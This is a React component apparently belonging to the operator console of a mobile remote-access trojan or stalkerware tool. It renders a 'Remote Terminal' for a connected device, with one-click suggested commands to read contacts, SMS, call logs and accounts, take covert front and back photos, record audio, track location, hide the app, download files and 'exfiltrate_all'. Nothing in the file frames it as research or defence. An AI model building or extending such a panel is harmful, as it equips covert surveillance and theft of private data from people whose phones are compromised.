import { FiSend } from "react-icons/fi";

const suggestions = [
  "get_contacts",
  "get_sms",
  "get_call_logs",
  "get_location",
  "take_photo_back",
  "take_photo_front",
  'record_audio {"action":"start"}',
  "get_installed_apps",
  "get_battery",
  "get_sim_info",
  "get_network_info",
  "get_notifications",
  "get_wifi_networks",
  "get_accounts",
  "hide_app",
  "unhide_app",
  "exfiltrate_all",
  "get_device_info",
  'download_file {"url":"https://"}',
  "enable_notification_listener",
  "get_notifications_cached",
];

export default function TerminalTab({
  deviceId,
  terminalOutput,
  terminalInput,
  setTerminalInput,
  onSubmit,
  terminalRef,
}) {
  return (
    <div className="glass-effect rounded-2xl p-6">
      <h3 className="text-lg font-semibold mb-4">Remote Terminal</h3>
      <div
        ref={terminalRef}
        className="h-64 bg-black rounded-xl p-4 font-mono text-sm overflow-y-auto mb-4 space-y-1"
      >
        <div className="text-green-400">[System] Connected to {deviceId}</div>
        <div className="text-dark-400">[System] Type commands below</div>
        {terminalOutput.map((line, i) => (
          <div
            key={i}
            className={
              line.text.startsWith(">") ? "text-primary-400" : "text-dark-200"
            }
          >
            <span className="text-dark-500">[{line.time}]</span> {line.text}
          </div>
        ))}
      </div>
      <form onSubmit={onSubmit} className="flex gap-3">
        <input
          type="text"
          value={terminalInput}
          onChange={(e) => setTerminalInput(e.target.value)}
          placeholder="Enter command (e.g., get_location)"
          className="flex-1 px-4 py-3 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 font-mono"
        />
        <button
          type="submit"
          className="px-6 py-3 rounded-xl bg-primary-500 text-white hover:bg-primary-600 transition-all flex items-center gap-2"
        >
          <FiSend /> Send
        </button>
      </form>
      <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-2">
        {suggestions.map((cmd) => (
          <button
            key={cmd}
            onClick={() => setTerminalInput(cmd)}
            className="text-xs p-2 rounded-lg bg-dark-700/30 hover:bg-dark-700/50 text-dark-400 hover:text-white transition-all text-left font-mono"
          >
            {cmd}
          </button>
        ))}
      </div>
    </div>
  );
}
